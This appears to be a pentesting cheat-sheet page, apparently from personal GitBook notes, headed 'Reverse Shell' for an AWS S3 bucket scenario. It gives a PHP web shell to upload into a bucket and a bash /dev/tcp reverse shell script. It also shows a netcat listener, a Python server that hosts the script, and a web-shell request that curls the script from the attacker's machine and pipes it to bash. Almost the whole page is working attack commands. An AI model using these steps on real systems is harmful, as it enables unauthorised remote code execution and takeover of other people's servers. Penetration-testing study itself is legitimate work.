---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Reverse Shell

## <mark style="color:purple;">For awscli</mark>

* Check if we have remote command execution

{% code overflow="wrap" lineNumbers="true" %}
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php #Upload in the bucket
http://$url/shell.php?cmd=id #On browser, if response we have access
```
{% endcode %}

***

* Create bash file for reverse shell

{% code overflow="wrap" lineNumbers="true" %}
```bash
#!/bin/bash 
bash -i >& /dev/tcp/$myip/$portcat 0>&1 #Arbitrary port
```
{% endcode %}

***

* Listen with netcat

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -nvlp $portcat
```
{% endcode %}

***

* Create a server with python

{% code overflow="wrap" lineNumbers="true" %}
```bash
python3 -m http.server $port #Must be created at the same place where the reverse shell script is
```
{% endcode %}

***

* Make curl from local server to get reverse shell file and pass it to bash of the machine

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$url/shell.php?cmd=curl%20$myip:$portpy/$shfile|bash
```
{% endcode %}

***

